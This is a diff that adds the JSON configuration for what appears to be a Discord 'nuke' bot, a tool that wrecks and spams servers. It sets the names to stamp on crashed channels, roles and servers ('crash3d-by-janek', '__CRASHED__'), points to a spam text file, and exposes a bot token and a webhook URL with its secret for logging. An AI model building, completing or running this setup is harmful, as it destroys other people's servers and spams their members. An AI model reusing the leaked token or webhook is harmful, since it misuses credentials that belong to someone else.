@@ -1,0 +1,21 @@
+{
+	"token": "MTEwNjMyMjk2NjQ5MDM4NjU0Mg.GsyueC.-6Posd07bVM8hZEdRjeb-Ca_UT_jhAKvo0y0EA",
+	"prefix": ".",
+	"loghook": "https://discord.com/api/webhooks/1106338723215446119/lZSwKBYcPsHPGSssO88GcxnfcTIvbSzWccDzdDNJkS_xoyly-7kgWHMPIn-VJVhsVQ_l",
+	"command_cooldown_time": 60,
+
+	"developer_list": [695690814491328642],
+	"developer_success_icon_url": "",
+	"developer_error_icon_url": "",
+
+	"nuke_channels_name": "crash3d-by-janek",
+	"nuke_voice_name": "Crash By CCT",
+	"nuke_categories_name": "Svintus pridet",
+
+	"nuke_server_name": "??>>>__CRASHED__<<<??",
+	"nuke_roles_name": "svin",
+	"nuke_webhook_name": "Svintus pridet",
+
+	"nuke_avatar_file": "avatar.png",
+	"spam_text_file": "spam_text.txt"
+}
